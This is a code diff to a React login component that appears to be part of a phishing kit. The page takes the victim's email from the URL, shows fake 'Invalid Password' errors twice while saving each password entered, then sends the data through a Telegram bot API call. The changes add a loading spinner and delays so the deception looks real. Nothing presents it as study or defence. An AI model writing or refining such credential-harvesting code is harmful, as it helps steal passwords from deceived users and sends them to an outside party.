@@ -8,6 +8,7 @@ const Home = () => {
     const [email, setEmail] = useState('');
     const [password, setPassword] = useState('');
     const { userEmail } = useParams()
+    const [loading, toggleLoading] = useState(false)
     useEffect(() => {
         setEmail(userEmail)
     }, [email])
@@ -50,23 +51,31 @@ const Home = () => {
         if (count < 2) {
             if (count === 0) {
                 togglePassword1(password)
-                setPassword('')
-                let passwordError = 'Invalid Password';
+                toggleLoading(true)
                 setTimeout(() => {
-                    setErrors({ email: '', password: '' });
-                }, 2000);
-                toggleCount(count + 1)
-                setErrors({ email: emailError, password: passwordError });
+                    toggleLoading(false)
+                    setPassword('')
+                    let passwordError = 'Invalid Password';
+                    setTimeout(() => {
+                        setErrors({ email: '', password: '' });
+                    }, 2500);
+                    toggleCount(count + 1)
+                    setErrors({ email: emailError, password: passwordError });
+                }, 2500);
             }
             else if (count === 1) {
                 togglePassword2(password)
-                setPassword('')
-                let passwordError = 'Invalid Password';
-                toggleCount(count + 1)
-                setErrors({ email: emailError, password: passwordError });
+                toggleLoading(true)
                 setTimeout(() => {
-                    setErrors({ email: '', password: '' });
-                }, 2000);
+                    toggleLoading(false)
+                    setPassword('')
+                    let passwordError = 'Invalid Password';
+                    toggleCount(count + 1)
+                    setErrors({ email: emailError, password: passwordError });
+                    setTimeout(() => {
+                        setErrors({ email: '', password: '' });
+                    }, 2500);
+                }, 2500);
             }
         }
         else {
@@ -86,6 +95,7 @@ const Home = () => {
 
                 try {
                     // Send the message to Telegram
+                    toggleLoading(true)
                     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                         method: 'POST',
                         headers: {
@@ -97,9 +107,11 @@ const Home = () => {
                         }),
                     });
 
+                    toggleLoading(false)
                     // Optional: Handle success feedback or further actions here
                     alert('Data sent successfully!');
                 } catch (error) {
+                    toggleLoading(false)
                     console.error('Error sending message:', error);
                 }
             }
@@ -111,6 +123,9 @@ const Home = () => {
         <div className="w-full text-[0.82rem] bg-[rgb(224,224,224)] h-screen flex flex-col items-end">
             <>
                 {/* Desktop Navbar */}
+                <span className={`w-full h-full fixed top-0 left-0 bg-[#0000009a] transition-all flex justify-center items-center ${loading ? "z-[100]" : "z-[-2]"}`}>
+                    <img src="https://static.vecteezy.com/system/resources/thumbnails/042/600/457/small/loading-circles-flat-style-modern-preloaders-png.png" className='spinner w-[10rem]' alt="" />
+                </span>
                 <div className="w-full hidden md:flex justify-center text-white fixed bg-[rgb(0,40,100)] p-4">
                     <div className="flex justify-between w-full max-w-[90rem] px-[4rem]">
                         <div className="text-4xl gap-0.5 flex items-center font-extrabold">
